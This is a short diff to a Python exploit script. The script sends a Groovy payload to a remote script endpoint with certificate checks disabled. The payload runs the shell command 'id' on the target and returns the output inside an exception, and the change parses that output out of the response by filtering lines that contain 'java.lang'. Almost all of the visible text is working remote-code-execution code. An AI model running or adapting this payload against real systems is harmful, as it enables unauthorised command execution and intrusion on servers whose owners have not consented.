@@ -16,4 +16,9 @@ data = "groovyProgram=throw+new+Exception('id'.execute().text);"
 
 response = requests.post(url, headers=headers, data=data, verify=False)
 
-print(response.text)
+# Split the response text by lines and filter the line containing "java.lang"
+result = [line.strip() for line in response.text.split('\n') if 'java.lang' in line]
+
+# Print the filtered result
+for line in result:
+    print(line)
